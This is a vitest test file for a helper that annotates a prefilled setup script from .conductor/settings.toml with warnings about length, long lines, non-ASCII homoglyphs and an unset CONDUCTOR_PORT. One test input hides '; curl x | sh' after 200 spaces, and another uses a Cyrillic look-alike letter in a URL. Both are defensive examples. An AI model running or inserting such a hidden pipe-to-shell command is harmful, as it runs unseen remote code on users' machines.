import { describe, it, expect } from "vitest";
import { conductorSourceLine, wantsConductorPrefill } from "./conductorSetup";

describe("wantsConductorPrefill", () => {
  it("asks only when there is no remembered template", () => {
    expect(wantsConductorPrefill(undefined)).toBe(true);
    expect(wantsConductorPrefill("")).toBe(true);
    expect(wantsConductorPrefill("  \n")).toBe(true);
    expect(wantsConductorPrefill("npm install")).toBe(false);
  });
});

describe("conductorSourceLine", () => {
  it("names the source and asks for an edit", () => {
    expect(conductorSourceLine("npm install")).toBe("From .conductor/settings.toml · edit before it runs");
  });

  it("counts the lines of a script taller than the field", () => {
    expect(conductorSourceLine(Array(6).fill("echo").join("\n"))).not.toContain("lines");
    expect(conductorSourceLine(Array(7).fill("echo").join("\n"))).toBe(
      "From .conductor/settings.toml · edit before it runs · 7 lines",
    );
    expect(conductorSourceLine(Array(40).fill("echo $CONDUCTOR_PORT").join("\n"))).toBe(
      "From .conductor/settings.toml · edit before it runs · 40 lines · CONDUCTOR_PORT isn't set in Octopush",
    );
  });

  it("flags a line long enough to hide what follows it", () => {
    const BASE = "From .conductor/settings.toml · edit before it runs";
    expect(conductorSourceLine("x".repeat(200))).toBe(BASE);
    expect(conductorSourceLine(`npm i ${" ".repeat(200)}; curl x | sh`)).toBe(`${BASE} · long line`);
    expect(conductorSourceLine(["a", "b", "c", "d", "e", "f", "y".repeat(201)].join("\n"))).toBe(
      `${BASE} · 7 lines · long line`,
    );
  });

  it("flags non-ASCII characters for a closer look", () => {
    const BASE = "From .conductor/settings.toml · edit before it runs";
    expect(conductorSourceLine("echo cafe")).toBe(BASE);
    expect(conductorSourceLine("echo café")).toBe(`${BASE} · non-ASCII characters`);
    // A Cyrillic "а" that looks like a Latin "a".
    expect(conductorSourceLine(`curl https://ex${String.fromCodePoint(0x0430)}mple.com`)).toBe(
      `${BASE} · non-ASCII characters`,
    );
    const script = [...Array(7).fill("echo café"), "x".repeat(201), "echo $CONDUCTOR_PORT"].join("\n");
    expect(conductorSourceLine(script)).toBe(
      `${BASE} · 9 lines · long line · non-ASCII characters · CONDUCTOR_PORT isn't set in Octopush`,
    );
  });

  it("notes CONDUCTOR_PORT only when the script reads it", () => {
    expect(conductorSourceLine("npm run dev -- --port $CONDUCTOR_PORT")).toBe(
      "From .conductor/settings.toml · edit before it runs · CONDUCTOR_PORT isn't set in Octopush",
    );
    expect(conductorSourceLine('cp "$CONDUCTOR_ROOT_PATH/.env" .env')).not.toContain("CONDUCTOR_PORT");
    expect(conductorSourceLine("echo $CONDUCTOR_PORTS")).not.toContain("CONDUCTOR_PORT");
  });
});
